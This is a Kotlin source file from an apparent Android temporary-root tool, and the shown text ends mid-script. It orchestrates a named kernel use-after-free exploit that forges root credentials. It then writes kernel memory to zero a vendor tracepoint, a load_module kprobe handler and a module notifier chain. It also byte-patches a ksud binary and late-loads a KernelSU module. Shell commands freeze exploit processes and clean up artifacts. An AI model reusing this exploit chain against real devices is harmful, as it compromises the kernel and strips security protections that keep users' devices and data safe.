package me.yuki.fina.adbroot.flow

import android.content.Context
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import me.yuki.fina.adbroot.core.KernelMap
import me.yuki.fina.adbroot.core.Manager
import me.yuki.fina.adbroot.core.ManagerProbe
import me.yuki.fina.adbroot.core.Managers
import me.yuki.fina.adbroot.core.Shell
import java.io.File

/**
 * 临时 root 全流程。
 *
 * 原理：CVE-2026-98260（posix-cpu-timers 的 exec 失败 UAF）。
 *   louise → 抢占 order-1 slab → 回收 zombie 时 rb_erase 写 8 字节
 *   → fake cred（uid 0 + 全 caps + u:r=kernel:s0）→ 用它去掉四处拦截
 *   → late-load kernelsu.ko → 拿到 u:r=ksu:s0 和 su。
 *
 * 这里只做编排，具体动作在 Plant / KRead / Kallsyms 里。
 */
class RootFlow(
    private val context: Context,
    private val sh: Shell,
    private val manager: Manager,
) {
    /** 日志出口（UI 会同时映射成二次元台词）。 */
    var log: (String) -> Unit = {}

    private val WAKE_CMD = "[ -p ${Device.CHAN}/wake ] || { rm -f ${Device.CHAN}/wake; mkfifo ${Device.CHAN}/wake 2>/dev/null; }; chmod 666 ${Device.CHAN}/wake 2>/dev/null; echo x > ${Device.CHAN}/wake 2>/dev/null"

    private val plant by lazy { Plant(sh, context.cacheDir, log) }
    private val kread by lazy { KRead(sh, context.cacheDir, log) }

    private fun say(msg: String) = log(msg)

    /** 最近一趟批次里授权是否成功（runLoadBatch 里写） */
    private var lastGrantOk = false

    /** 这一轮是不是「续跑」（模块早就在了，没重新跑漏洞）。UI 用它决定要不要再拉起管理器。 */
    var lastRunWasResume = false
        private set

    /** late-load 时用过的「管理器自带 ksud」路径；后续 set-manager / grant 复用它。 */
    private var managerKsud: String = ""

    suspend fun run(payloadDir: File): Boolean {
        if (!checkKernel()) return false
        if (!checkManager()) return false
        if (!waitBoot()) return false

        // 注意：上一轮结束后的 louise 会变成僵尸（STAT=Z，名字带方括号），
        // 那不是「还在跑」，不能拿它当续跑依据。
        val running = sh.exec(
            "ps -A -o STAT,NAME 2>/dev/null | awk '($2==\"louise\" || $2==\"tpd_calib\" || $2==\"timer98260\") && $1 !~ /Z/ {c++} END {print c+0}'",
            10_000,
        ).stdout.trim().toIntOrNull() ?: 0
        if (running > 0) {
            lastRunWasResume = true
            return resume()
        }

        say("[1/6] 推送文件到 /data/local/tmp")
        if (!pushFiles(payloadDir)) return false

        say("[2/6] 启动 louise（fake 模式）")
        val slide = startFake() ?: return false
        say("    拿到内核偏移：${KernelMap.hex(slide)}")

        say("[3/6] 清 vr.ko 的 sys_exit tracepoint")
        if (!stepTracepoint(slide)) return false

        say("[4/6] 摘掉 load_module 上的 kprobe")
        if (!stepKprobe(slide)) return false

        say("[5/6] 截断 module_notify_list 的通知链")
        if (!stepNotifier(slide)) return false

        // 三处 plant 都做完了，后面只剩「算 kallsyms + late-load」，它们走 dispatcher，不需要漏洞本体。
        // 但 fake 模式的 plant_server 是 200ms 轮询，在部分 ROM 上 usleep 会退化成忙等（实测 70% CPU），
        // 所以这里主动把它冻住：SIGSTOP 不影响已拿到的 cred，也不需要重启。
        freezeExploit()

        say("[6/6] 生成 kallsyms 并 late-load")
        if (!kallsyms(payloadDir, slide)) return false
        if (!lateLoad()) return false

        if (!verify()) return false
        // 判断「内核现在认哪家」只看模块本体大小（最可靠的指纹）：
        //   233472 = 官方 KernelSU；270336 = BakaSU(ReSukiSU)；303104/364544 = FinaSU；499712 = KernelSU-Next；536576 = SukiSU-Ultra
        // 不能用 ksud debug package —— 它打的是 ksud 二进制自带的默认包名，不是内核状态。
        val moduleLine = bestModuleLine()
        val moduleKb = Regex("kernelsu\\s+(\\d+)")
            .find(moduleLine)?.groupValues?.getOrNull(1)?.toIntOrNull() ?: 0
        val owner = when (moduleKb) {
            233472 -> "me.weishu.kernelsu" to "官方 KernelSU"
            270336 -> "com.resukisu.resukisu" to "BakaSU (ReSukiSU)"
            303104, 311296, 364544 -> "me.yuki.fina" to "FinaSU"
            536576 -> "com.sukisu.ultra" to "SukiSU-Ultra"
            495616, 499712 -> "com.rifsxd.ksunext" to "KernelSU-Next"
            else -> "" to ""
        }
        if (owner.first.isNotEmpty()) {
            say("    模块 · ${owner.second} · $moduleKb")
            if (owner.first != manager.pkg) {
                say("[!] 与所选不符（${manager.name}）")
            }
        }
        return true
    }

    /**
     * 冻住漏洞本体（`louise fake` 与 `exe wait fake` 同名同二进制）。
     *
     * 为什么要冻：fake 阶段的 plant_server 是 200 ms 轮询，部分 ROM 上 usleep 会立即返回 →
     * 变成忙等（实测 `louise` 瞬时 70% CPU，state=R）。三处 plant 做完后它已经没有用处：
     * 后面的 kallsyms / late-load 全部由 dispatcher（已是 root 的 sh）执行。
     *
     * 只能 SIGSTOP，不能 kill：kill 会让父进程 waitpid 返回并释放 fake cred 页 → 内核 panic。
     */
    private suspend fun freezeExploit() {
        val cmd = buildString {
            append("for n in ${Device.EXP} ")
            Device.EXP_LEGACY.forEach { append("$it ") }
            append("; do for p in ${'$'}(pidof ${'$'}n 2>/dev/null); do ")
            append("kill -STOP ${'$'}p 2>/dev/null && echo FROZE=${'$'}p; ")
            append("/system/bin/su -c \"kill -STOP ${'$'}p\" >/dev/null 2>&1; ")
            append("done; done; echo FREEZE_DONE")
        }
        val r = sh.exec(cmd, 12_000)
        val froze = Regex("FROZE=(\\d+)").findAll(r.text).map { it.groupValues[1] }.toList()
        if (froze.isEmpty()) {
            say("    漏洞本体 · 已经不在了（无需冻结）")
        } else {
            say("    漏洞本体 · 已冻结 ${froze.joinToString("、")}（CPU 归零，cred 保留）")
        }
    }
    /** 尽力清一次现场（失败也不抛，不影响主流程结果）。 */
    suspend fun cleanTmp() {
        runCatching { sh.exec(Device.CLEAN_SCRIPT, 25_000) }
    }

    /** 带兜底清理的入口：无论成功、失败还是异常，都会把这一轮的残留清掉。 */
    suspend fun runWithCleanup(payloadDir: File): Boolean = try {
        run(payloadDir)
    } finally {
        cleanTmp()
    }
    /** timer 还在跑时的续跑：模块已加载且 su 可用，就只做验证 + 授权。 */
    private suspend fun resume(): Boolean {
        say("[续跑] louise 已在跑，先看内核状态…")
        // 上一轮的 dispatcher 可能还在（旧版本没有冻结逻辑，会一直烧一个核）——先把它停掉再往下走。
        val freezeOld = sh.exec(
            "for p in ${'$'}(ps -A -o PID,ARGS 2>/dev/null | grep -E '[ /]louise_cmd.sh|fake_shell.sh' | grep -v grep " +
                "| awk '{print ${'$'}1}'); do " +
                "  kill -STOP ${'$'}p 2>/dev/null; " +
                "  st=${'$'}(awk '{print ${'$'}3}' /proc/${'$'}p/stat 2>/dev/null); " +
                "  if [ \"${'$'}st\" != \"T\" ]; then " +
                "    /system/bin/su -c \"kill -STOP ${'$'}p\" >/dev/null 2>&1; " +
                "    st=${'$'}(awk '{print ${'$'}3}' /proc/${'$'}p/stat 2>/dev/null); " +
                "  fi; " +
                "  echo \"FREEZE pid=${'$'}p state=${'$'}st\"; " +
                "done; echo FREEZE_DONE",
            25_000,
        )
        val freezeLines = freezeOld.text.lines().filter { it.startsWith("FREEZE ") }
        if (freezeLines.isNotEmpty()) {
            freezeLines.forEach { line ->
                val pid = Regex("""pid=(\d+)""").find(line)?.groupValues?.get(1) ?: "?"
                val st = Regex("""state=(\S*)""").find(line)?.groupValues?.get(1) ?: "?"
                if (st == "T") {
                    say("续跑 · 上一轮的跑腿进程还在烧 CPU，已冻结（PID $pid）")
                } else {
                    say("[!] 上一轮的跑腿进程（PID $pid）停不下来：状态 $st")
                    say("    它是 root 身份，普通权限的 kill 发不进去；在终端执行一次就行：")
                    say("    su -c 'kill -STOP $pid'")
                }
            }
        }
        val mod = sh.exec("grep -c kernelsu /proc/modules 2>/dev/null", 10_000)
            .stdout.trim().toIntOrNull() ?: 0
        if (mod == 0) {
            say("[!] 模块未加载 · 勿杀进程 · 重启后再试")
            return false
        }
        // 续跑也报一下内核里到底是谁的模块，免得「选 A 实际是 B」看不出来
        val modLine = sh.exec("grep -m1 kernelsu /proc/modules 2>/dev/null", 10_000).stdout.trim()
        val modKb = Regex("kernelsu\\s+(\\d+)")
            .find(modLine)?.groupValues?.getOrNull(1)?.toIntOrNull() ?: 0
        val ownerNow = when (modKb) {
            233472 -> "me.weishu.kernelsu" to "官方 KernelSU"
            270336 -> "com.resukisu.resukisu" to "BakaSU (ReSukiSU)"
            303104, 364544 -> "me.yuki.fina" to "FinaSU"
            536576 -> "com.sukisu.ultra" to "SukiSU-Ultra"
    499712 -> "com.rifsxd.ksunext" to "KernelSU-Next"
            else -> "" to ""
        }
        if (ownerNow.first.isNotEmpty()) {
            say("    模块 · ${ownerNow.second} · $modKb")
            if (ownerNow.first != manager.pkg) {
                say("[!] 与所选不符（${manager.name}）· 换需重启重跑")
            }
        }
        if (!verify()) return false
        // 续跑这条路上没有 root 会话可用（fake cred 那趟已经过去了），
        // 只能用 su 去补授权；su 在 Shizuku 通道里常常被拦，那就只提示、不算失败。
        val su = sh.exec("/system/bin/su -c id 2>&1 | head -1", 20_000).stdout.trim()
        val suOk = su.startsWith("uid=0") || su.contains("uid=0(") || su.contains("ksu:s0")
        if (!suOk) {
            say("    su 不可用 · 仅验证")
            say("    换管理器：重启后完整跑一次")
        } else {
            say("    内核里已经有模块了，管理器会自己认出来")
        }
        return true
    }

    // ------------------------------------------------------------------ 前置检查

    /** 内核构建不匹配就别动手：这个方案的所有地址都是绑死 6.12.58 这一版的。 */
    private suspend fun checkKernel(): Boolean {
        val rel = sh.exec("uname -r", 10_000).stdout.trim()
        say("内核：${rel.ifEmpty { "读不到" }}")
        if (rel != KernelMap.KERNEL_RELEASE) {
            say("[X] 内核不符 · 需 ${KernelMap.KERNEL_RELEASE}")
            return false
        }
        say("    版本匹配 ✓")
        return true
    }

    private suspend fun checkManager(): Boolean {
        say("校验管理器：${manager.name}（${manager.pkg}）")
        if (manager.stack.isEmpty()) {
            say("    无内置 ksud · 用 /data/app 自带")
        }
        if (manager.stack == "official" || manager.stack == "fina") {
            val ok = ManagerProbe.probe(sh, manager.pkg)
            if (!ok.present) {
                say("[X] 还没安装这个管理器，先在下面点下载/安装按钮")
                return false
            }
            say("    管理器已装：${manager.name}（uapi ${ok.uapi.takeIf { it >= 0 } ?: manager.uapi}）")
            return true
        }
        if (manager.ownModuleOnly) {
            // 以前这里直接拦掉。现在不拦：BakaSU / SukiSU / Next 都验证过
            // 「用它自带 ksud 装它自己的模块」可行，YukiSU 也按同一条路先试一次。
            say("    它只认自家编译的模块：这一轮就走它自带的 ksud，能装上就成")
        }
        val d = ManagerProbe.probe(sh, manager.pkg)
        if (!d.present) {
            say("[X] 没装这个管理器，先在上面的按钮下载安装")
            return false
        }
        val eff = ManagerProbe.effectiveUapi(manager, d)
        if (eff < KernelMap.KERNEL_UAPI) {
            say("[X] uapi $eff < ${KernelMap.KERNEL_UAPI} · 换一家")
            return false
        }
        say("    uapi=$eff 匹配（内核 ${KernelMap.KERNEL_UAPI}）管理器：${manager.name}")
        return true
    }

    private suspend fun waitBoot(): Boolean {
        repeat(180) {
            val done = sh.exec("getprop sys.boot_completed 2>/dev/null", 5_000).stdout.trim()
            if (done == "1") return true
            delay(1_000)
        }
        say("[X] 等系统启动超时")
        return false
    }

    // ------------------------------------------------------------------ 推送 / 启动

    private suspend fun pushFiles(payloadDir: File): Boolean {
        // 环境自检：/data/local/tmp 的属主 / 权限 / SELinux 标签一旦被改坏，
        // 推送就一定失败，而终端用户只能把 flow.log 发过来 —— 所以先记现场，再尝试自愈。
        if (!ensureTmpWritable()) return false

        // 先清掉旧文件：上一次跑完留下的目标是 root 属主 / 755，Shizuku 的 shell(2000) 打不开，
        // 直接 cat > 会 EACCES，表现就是「推送失败：louise」。坏 inode 也一并清掉。
        // 上一轮的残留（louise、probe、kall、mgr_ksud_path、ksu_stage.sh、chan/、auto/ …）
        // 统一用 Device.CLEAN_SCRIPT 清一遍：先 SIGSTOP 旧 dispatcher，再删，避免删了还在跑的脚本。
        sh.exec(Device.CLEAN_SCRIPT, 25_000)
        for ((name, remote) in Device.FILES) {
            val f = File(payloadDir, name)
            if (!f.exists()) {
                say("[X] 缺少 payload：$name")
                return false
            }
            if (!sh.push(f, remote)) {
                // 把目标文件现场摊开：属主/权限能直接看出是不是旧 root 文件挡住了。
                // 注意 stderr 也要取：`echo x >` 的报错是 shell 打的，不会进 stdout。
                val r = sh.exec(
                    "ls -ld ${Device.TMP}/$name 2>&1; " +
                        "echo x > ${Device.TMP}/$name 2>&1; echo WRITE_RC=${'$'}?; " +
                        "ls -ldZ ${Device.TMP} 2>&1; " +
                        "df -h ${Device.TMP} 2>/dev/null | tail -1",
                    10_000,
                )
                say("[X] 推送失败：$name")
                r.text.lineSequence().filter { it.isNotBlank() }.take(5).forEach { say("    $it") }
                return false
            }
        }
        val ch = Device.CHAN
        sh.exec(
            "chmod 755 ${Device.TMP}/louise ${Device.TMP}/louise_cmd.sh ${Device.TMP}/probe 2>/dev/null; " +
                // 只重建 chan 这个子目录（坏 FIFO 只能靠重建清掉）；/data/local/tmp 自身永不删除
                "rm -rf $ch; mkdir -p $ch; chmod 777 $ch; " +
                "echo 1 > $ch/kptr_0000; chmod 666 $ch/kptr_0000; " +
                "rm -f $ch/run $ch/busy $ch/plant_req $ch/plant_res $ch/plant_done; " +
                "rm -f ${Device.LOG}",
            30_000,
        )
        say("    工具包准备好啦")
        return true
    }

    /**
     * 推送前的环境自检 + 自愈（2.6.9 的轻量版）。
     *
     * 只看两件事：能不能 touch、目录是什么属主/权限/标签。
     * 能修就当场修：chmod → restorecon → 已有 root 时用 su 按 init 的标准恢复。
     */
    private suspend fun ensureTmpWritable(): Boolean {
        val probe = sh.exec(
            "id 2>&1; ls -ldZ ${Device.TMP} 2>&1; " +
                "touch ${Device.TMP}/.rf_wtest 2>&1 && echo TOUCH_OK || echo TOUCH_FAIL; " +
                "rm -f ${Device.TMP}/.rf_wtest 2>/dev/null; echo ENV_DONE",
            15_000,
        )
        val text = probe.text.trim()
        if (text.contains("TOUCH_OK")) return true

        say("[!] /data/local/tmp 不可写，先试着自愈")
        text.lineSequence().filter { it.isNotBlank() }.take(4).forEach { say("    $it") }

        sh.exec("chmod 777 ${Device.TMP} 2>&1; chmod 771 ${Device.TMP} 2>&1; echo DONE", 10_000)
        sh.exec("restorecon ${Device.TMP} 2>&1; echo DONE", 10_000)
        sh.exec(
            "su -c 'chown shell:shell ${Device.TMP} 2>/dev/null; " +
                "chmod 771 ${Device.TMP} 2>/dev/null; " +
                "restorecon -R ${Device.TMP} 2>/dev/null' 2>&1; echo DONE",
            15_000,
        )

        val again = sh.exec(
            "touch ${Device.TMP}/.rf_wtest 2>&1 && echo TOUCH_OK || echo TOUCH_FAIL; " +
                "ls -ldZ ${Device.TMP} 2>&1; rm -f ${Device.TMP}/.rf_wtest 2>/dev/null",
            10_000,
        )
        val t2 = again.text.trim()
        if (t2.contains("TOUCH_OK")) {
            say("    自愈成功，继续")
            return true
        }
        say("[X] /data/local/tmp 仍然不可写")
        t2.lineSequence().filter { it.isNotBlank() }.take(3).forEach { say("    $it") }
        say("    这是系统层面的问题（属主 / 权限 / SELinux 标签被改坏）：")
        say("    只能由 root 或系统重装修复，app 自己改不了；需要的话导出「诊断包」。")
        return false
    }
    private suspend fun startFake(): Long? {
        val start = sh.exec(
            "cd ${Device.TMP} && setsid sh -c 'nohup ./louise fake > louise.log 2>&1 < /dev/null &' ; echo started",
            30_000,
        )
        say("    start: ${start.stdout.trim()}")

        var tick = 0
        while (tick < 90) {
            tick++
            delay(3_000)

            val ready = sh.exec("grep -c 'plant server ready' ${Device.LOG} 2>/dev/null", 10_000)
                .stdout.trim().toIntOrNull() ?: 0
            if (ready > 0) {
                // 先看这轮漏洞本身成没成：fake cred 没落地就没有 root 会话，后面的 kread/late-load 全都白跑。
                val credFail = sh.exec(
                    "grep -c -e 'child did not reach euid 0' -e 'cred write did not land' ${Device.LOG} 2>/dev/null",
                    10_000,
                ).stdout.trim().toIntOrNull() ?: 0
                if (credFail > 0) {
                    say("[X] 漏洞未成功 · cred 未落地 · uid 2000")
                    say("    重启后再点一次")
                    return null
                }
                val line = sh.exec("grep -m1 -o 'slide=0x[0-9a-f]*' ${Device.LOG} 2>/dev/null", 10_000)
                    .stdout.trim()
                val slide = KernelMap.parseU64(line.substringAfter('=', ""))
                if (slide == null) {
                    say("[X] 已 ready 但解析不到 slide")
                    return null
                }
                return slide
            }

            val alive = sh.exec("ps -A -o NAME 2>/dev/null | grep -c -E 'louise|gandalfr|tpd_calib|timer98260'", 10_000)
                .stdout.trim().toIntOrNull() ?: 0
            if (alive == 0) {
                say("[X] louise 已退出 · 开机后再试")
                return null
            }
            if (tick % 2 == 0) say("    未就绪（$tick）…")
        }
        say("[X] plant server 超时 · 重启后再试")
        return null
    }

    // ------------------------------------------------------------------ 四处拦截

    /** 1) vr.ko 挂在 sys_exit 上的 tracepoint：把 funcs 指针清零。 */
    private suspend fun stepTracepoint(slide: Long): Boolean {
        val target = KernelMap.TRACE_SYS_EXIT + slide + 0x48
        if (!plant.zero(target)) {
            say("[X] plant 失败：${KernelMap.hex(target)}")
            return false
        }
        val v = kread.read(listOf(target)).firstOrNull()
        say("    vr funcs after = ${KernelMap.hex(v)}")
        if (v != 0L) say("[!] 读回来不是 0，可能有别的 tracepoint 重新挂上了（继续）")
        return true
    }

    /** 2) 厂商在 load_module 入口挂的 kprobe：把 pre_handler 清零。 */
    private suspend fun stepKprobe(slide: Long): Boolean {
        val imageBase = KernelMap.IMAGE_BASE + slide
        val lm = KernelMap.LOAD_MODULE + slide
        val bucket = KernelMap.bucket(lm)
        // kprobe_table 是内核 .bss 里的静态数组，必须加 slide，否则读到的是未映射地址
        val bucketAddr = KernelMap.KPROBE_TABLE + slide + bucket.toLong() * 8L

        val aggr = kread.read(listOf(bucketAddr)).firstOrNull()
        say("    bucket=$bucket aggr=${KernelMap.hex(aggr)}")
        if (aggr == null || aggr == 0L) {
            say("[!] 桶是空的，说明没有 kprobe 钩子（跳过）")
            return true
        }

        val head = kread.read(listOf(aggr + 0x28, aggr + 0x10))
        val addr = head.getOrNull(0)
        var node = head.getOrNull(1)
        say("    aggr.addr=${KernelMap.hex(addr)} list=${KernelMap.hex(node)}")
        if (addr != lm) {
            say("[!] aggr.addr 不是 load_module（期望 ${KernelMap.hex(lm)}），跳过")
            return true
        }

        var guard = 0
        while (node != null && node != 0L && guard < 16) {
            guard++
            val v = kread.read(listOf(node + 0x18, node + 0x30, node + 0x08))
            val nAddr = v.getOrNull(0)
            val pre = v.getOrNull(1)
            val next = v.getOrNull(2)
            say("    node=${KernelMap.hex(node)} addr=${KernelMap.hex(nAddr)} pre=${KernelMap.hex(pre)}")
            val isOurs = nAddr == lm
            val preOutsideImage = pre != null && pre != 0L &&
                (pre < imageBase || pre >= imageBase + 0x3000000L)
            if (isOurs && preOutsideImage) {
                if (!plant.zero(node + 0x30)) {
                    say("[X] plant pre_handler 失败")
                    return false
                }
                val after = kread.read(listOf(node + 0x30)).firstOrNull()
                say("    pre_handler after = ${KernelMap.hex(after)}")
                if (after != 0L) say("[!] 读回来不是 0（继续）")
                return true
            }
            node = next
        }
        say("[!] 链上没找到厂商节点（跳过）")
        return true
    }

    /** 3) module_notify_list 里厂商 notifier 返回 NOTIFY_BAD：把它的 next 清零截断。 */
    private suspend fun stepNotifier(slide: Long): Boolean {
        val tp = KernelMap.TRACE_MODULE_NOTIFY + slide
        val headAddr = KernelMap.MODULE_NOTIFY_LIST + slide + 0x40
        val head = kread.read(listOf(headAddr)).firstOrNull()
        say("    notifier head=${KernelMap.hex(head)}")
        var node = head

        var guard = 0
        while (node != null && node != 0L && guard < 16) {
            guard++
            val v = kread.read(listOf(node, node + 0x08))
            val call = v.getOrNull(0)
            val next = v.getOrNull(1)
            say("    node=${KernelMap.hex(node)} call=${KernelMap.hex(call)}")
            if (call == tp) {
                if (!plant.zero(node + 0x08)) {
                    say("[X] plant notifier 失败")
                    return false
                }
                val after = kread.read(listOf(node + 0x08)).firstOrNull()
                say("    notifier next after = ${KernelMap.hex(after)}")
                if (after != 0L) say("[!] 读回来不是 0（继续）")
                return true
            }
            node = next
        }
        say("[!] 链上没找到 trace_module_notify 节点（跳过）")
        return true
    }

    // ------------------------------------------------------------------ kallsyms / late-load

    private suspend fun kallsyms(payloadDir: File, slide: Long): Boolean = withContext(
        kotlinx.coroutines.Dispatchers.IO,
    ) {
        val json = File(payloadDir, "PD2546-symbols.json")
        val out = File(context.cacheDir, "kall")
        val count = Kallsyms.build(json, out, slide)
        if (count <= 0) {
            say("[X] 生成 kall 失败（symbols.json 缺失？）")
            return@withContext false
        }
        if (!sh.push(out, Device.KALL)) {
            say("[X] 推送 kall 失败")
            return@withContext false
        }
        say("    KALLSYMS_OK $count")
        true
    }

    /**
     * 装模块（完全按 GhostLock 的做法，全部在 root 批次里做）。
     *
     * GhostLock 的关键三条：
     *   1. ksud 用**选中管理器 APK 自带的 libksud.so**（root 才能 find /data/app）；
     *   2. 带 --package-name 时不传 --kmi；
     *   3. 之后死等 /proc/modules 里出现 kernelsu（50×0.1s）。
     * 这样主管理器在 late-load 那一刻就写成选中的那个，不需要事后 dynamic 授权
     * （我们的内核也不支持动态列表：实测 grant 返回 E0001）。
     * 自带 ksud 找不到/装不上时，退回内置 ksud。
     */
    private suspend fun lateLoad(): Boolean {
        val pkg = manager.pkg
        val release = sh.exec("uname -r", 10_000).stdout.trim()
        val kmi = when {
            release.contains("android16") -> "android16-6.12"
            else -> Regex("^(\\d+\\.\\d+)").find(release)?.groupValues?.getOrNull(1)?.let {
                when (it) {
                    "5.10" -> "android12-5.10"
                    "5.15" -> "android13-5.15"
                    "6.1" -> "android14-6.1"
                    "6.6" -> "android15-6.6"
                    "6.12" -> "android16-6.12"
                    "6.18" -> "android17-6.18"
                    else -> "android16-6.12"
                }
            } ?: "android16-6.12"
        }

        say("    内核 $release → $kmi")
        // 不内置任何驱动：用「选中管理器自己 APK 里的那把 ksud」去装它自己的驱动。
        // （PD2505 实测：只有 FinaSU 那把带匹配 6.12.58 的 ko，其余家的 ksud 会静默失败）
        say("    用 ${manager.name} 自带 ksud 装驱动")

        // 完全用管理器自带 ksud（工具箱那套），不做任何联网兜底。
        val koPath = "/data/local/tmp/auto/drv.ko"

        val statusPath = File(context.filesDir, "ks_module").absolutePath
        val batch = """
            STATUS="$statusPath"
            # App 是 untrusted_app：读 /proc/modules 和 /data/local/tmp 都被 SELinux 拦，
            # 只有自己 filesDir 下的这个文件一定读得到。root 侧统一用它回报结论。
            # 每行一条结论：第一行是结果，后面可以带 PKG=（这颗驱动是给哪个管理器装的）。
            publish() {
              printf '%s\n' "${'$'}@" > /data/local/tmp/ks_line 2>/dev/null
              cat /data/local/tmp/ks_line > "${'$'}STATUS" 2>/dev/null
              if [ ! -s "${'$'}STATUS" ]; then
                timeout -s KILL 5 /system/bin/su -c "cat /data/local/tmp/ks_line > ${'$'}STATUS" >/dev/null 2>&1
              fi
              chmod 666 "${'$'}STATUS" 2>/dev/null
              if [ ! -s "${'$'}STATUS" ]; then
                timeout -s KILL 5 /system/bin/su -c "chmod 666 ${'$'}STATUS" >/dev/null 2>&1
              fi
              [ -s "${'$'}STATUS" ]
            }
            echo ===LOAD===
            id
            [ -s ${Device.KALL} ] || echo KALL_SRC_MISSING
            cp ${Device.KALL} /data/adb/kall 2>/dev/null
            chmod 644 /data/adb/kall 2>/dev/null
            [ -s /data/adb/kall ] || echo KALL_DST_MISSING
            ls -l /data/adb/kall 2>/dev/null
        """.trimIndent() + "\n" + """
            OWN=$(find /data/app -name '*.so' -size +2M 2>/dev/null | grep "$pkg" | head -1)
            echo "OWN=${'$'}{OWN:-none}"
            mkdir -p /data/local/tmp/auto 2>/dev/null
            P=""
            if [ -n "${'$'}OWN" ]; then
              chmod 755 "${'$'}OWN" 2>/dev/null
              echo "${'$'}OWN" > /data/local/tmp/mgr_ksud_path
              # 管理器自带的是原版 ksud：本机 kptr_restrict=2 时它读不到 kallsyms 的地址，
              # 就会静默失败（RC=0、模块没进）。这里复制一份做等长字节替换，让它改读
              # /data/adb/kall 与 chan/kptr_0000 —— 跟以前内置那把补丁版 ksud 完全同一套处理。
              P=/data/local/tmp/auto/ksud_p
              if cp -f "${'$'}OWN" "${'$'}P" 2>/dev/null; then
                for o in $(grep -abo '/proc/kallsyms' "${'$'}P" 2>/dev/null | cut -d: -f1); do
                  printf '/data/adb/kall' | dd of="${'$'}P" bs=1 seek=${'$'}o conv=notrunc 2>/dev/null
                done
                for o in $(grep -abo '/proc/sys/kernel/kptr_restrict' "${'$'}P" 2>/dev/null | cut -d: -f1); do
                  printf '/data/local/tmp/chan/kptr_0000' | dd of="${'$'}P" bs=1 seek=${'$'}o conv=notrunc 2>/dev/null
                done
                chmod 755 "${'$'}P" 2>/dev/null
                echo "PATCHED=${'$'}P $(ls -l "${'$'}P" 2>/dev/null | awk '{print $5}')"
              else
                P=""
                echo PATCHED=skip
              fi
            fi
            if [ -z "${'$'}OWN" ]; then
              echo NO_KSUD_FOR_MANAGER
            else
              # ksud 返回即视为完成（用户要求）：RC 直接写进 App 自己的目录，
              # 这是 App 唯一稳定可读的位置（/proc/modules 被 SELinux 拦，/data/local/tmp 也不稳）。
              K="${'$'}{P:-${'$'}OWN}"
              if [ -n "${'$'}K" ]; then
                timeout -s KILL 25 "${'$'}K" late-load --allow-shell --kmi $kmi --package-name "$pkg" > /data/local/tmp/auto/ks1.log 2>&1
                RC=${'$'}?
                echo KS1_RC=${'$'}RC
                sed 's/^/KS: /' /data/local/tmp/auto/ks1.log 2>/dev/null
                publish "KS1_RC=${'$'}RC" "PKG=$pkg" || echo PUBLISH_RC_FAIL
                # ksud 返回 0 时模块往往还没注册进 /proc/modules：给 30 秒窗口，每 500ms 看一次，
                # 一出现就把真实模块行覆盖写回去（LOAD_HAS=0 不再是最终结论）。
                if [ "${'$'}RC" = "0" ]; then
                  i=0
                  while [ ${'$'}i -lt 60 ]; do
                    L=${'$'}(grep kernelsu /proc/modules 2>/dev/null | grep ' Live ' | head -1)
                    [ -z "${'$'}L" ] && L=${'$'}(grep -m1 kernelsu /proc/modules 2>/dev/null)
                    if [ -n "${'$'}L" ]; then
                      publish "${'$'}L" "PKG=$pkg" || echo PUBLISH_LIVE_FAIL
                      echo KSU_LOAD_OK
                      break
                    fi
                    /system/bin/usleep 500000 2>/dev/null || sleep 1
                    i=${'$'}((i+1))
                  done
                fi
              fi
              if [ -f /data/local/tmp/auto/drv.ko ] && ! grep -q kernelsu /proc/modules; then
                echo "KO=/data/local/tmp/auto/drv.ko"
                "${'$'}K" insmod /data/local/tmp/auto/drv.ko manager_package="$pkg" > /data/local/tmp/auto/ki.log 2>&1
                echo KI_RC=${'$'}?
                sed 's/^/KI: /' /data/local/tmp/auto/ki.log 2>/dev/null | head -8
              fi
            fi
            # ksud 有时会立刻把管理器切到前台；模块刚出现就先把工具箱带回前台继续收尾。
            if grep -q kernelsu /proc/modules; then
              am start --user 0 -f 0x10000000 -n ${'$'}APP_ID/me.yuki.fina.adbroot.MainActivity >/dev/null 2>&1
              echo TOOLBOX_RETURN_RC=${'$'}?
            fi
            echo -n "LOAD_HAS="; grep -c kernelsu /proc/modules
            grep -m1 kernelsu /proc/modules 2>/dev/null
            MSIZE=${'$'}(grep kernelsu /proc/modules 2>/dev/null | head -1 | awk '{print ${'$'}2}')
            echo "MOD_SIZE=${'$'}{MSIZE:-0}"
            """.trimIndent() + "\n" + """
{ echo "KMI=${'$'}kmi PKG=${'$'}pkg"; echo "LIVE=${'$'}(grep -c kernelsu /proc/modules 2>/dev/null)"; echo "AUTO:"; ls -l /data/local/tmp/auto/ 2>/dev/null | head -20; for f in ks1 ks2 ks3; do echo "[${'$'}f]"; tail -25 /data/local/tmp/auto/${'$'}f.log 2>/dev/null; done; } > /data/local/tmp/ks_keep.log 2>&1
            echo ===LOAD_END===
            # 收尾：先冻住父进程（louise 那个 fake 会话），再冻住 dispatcher 本身。
            # 用 STOP 不用 KILL —— KILL 会让 exe 的 waitpid 返回、释放 fake cred 页，直接 panic。
            OWNER=${'$'}("${'$'}KSU" debug package 2>/dev/null | head -1)
            [ -n "${'$'}OWNER" ] && echo "MODULE_OWNER=${'$'}OWNER"
            # 收尾：清掉这一轮的残留（只动 /data/local/tmp 里面的东西，绝不删 /data/local/tmp 自身）
            rm -f /data/local/tmp/auto/ksud_p 2>/dev/null
            rm -f /data/local/tmp/auto/drv*.ko /data/local/tmp/auto/*.log 2>/dev/null
            rm -rf /data/local/tmp/auto/*/ 2>/dev/null
            rm -rf /data/local/tmp/auto 2>/dev/null
            # 抹掉这一轮推上去的 payload：下轮冷启动从 assets 重新写，避免旧文件（root 属主 / 坏 inode）挡住推送
            cp -f /data/local/tmp/louise.log /data/local/tmp/keep_louise.log 2>/dev/null
            cp -f /data/local/tmp/ks_keep.log /data/local/tmp/keep_ks_prev.log 2>/dev/null
            rm -f /data/local/tmp/louise /data/local/tmp/gandalfr /data/local/tmp/tpd_calib /data/local/tmp/timer98260 /data/local/tmp/louise_cmd.sh /data/local/tmp/probe /data/local/tmp/louise.log /data/local/tmp/gandalfr.log /data/local/tmp/tpd_calib.log /data/local/tmp/fakeR.log 2>/dev/null
            rm -f /data/local/tmp/kall /data/local/tmp/mgr_ksud_path 2>/dev/null
            rm -f /data/local/tmp/mgr_*.apk 2>/dev/null
            echo CLEANED=1
            # 不在这个批次里冻结 louise_cmd.sh/父进程：它们可能是当前 dispatcher 的
            # 调用链，过早 SIGSTOP 会让 LOAD_END 和 busy 清理永远写不出来。
            # 独立的 stopDispatcherNow 会在结果已读回后处理冻结。
